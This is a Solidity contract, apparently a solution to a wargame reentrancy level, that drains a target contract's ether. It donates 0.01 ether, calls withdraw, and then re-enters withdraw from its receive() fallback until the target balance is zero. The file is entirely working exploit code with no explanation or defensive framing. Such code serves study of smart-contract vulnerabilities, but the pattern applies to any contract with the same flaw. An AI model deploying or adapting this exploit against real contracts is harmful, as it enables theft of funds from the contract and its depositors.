// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IReentrancy {
  function donate(address) external payable;
  function withdraw(uint256) external;
}

contract ReentranceHack {

  IReentrancy private immutable target;
  
  constructor(address _targetAddress) {
    target = IReentrancy(_targetAddress);
  }

  function attack() external payable {
    target.donate{value: 1e16}(address(this));
    target.withdraw(1e16);
    require(address(target).balance == 0, " target balance > 0");
  }

  receive() external payable {
    uint amount = min(1e16, address(target).balance);
    if (amount > 0) {
      target.withdraw(amount);
    }
  }

  function min(uint x, uint y) private pure returns (uint) {
    return x <= y ? x : y;
  }

}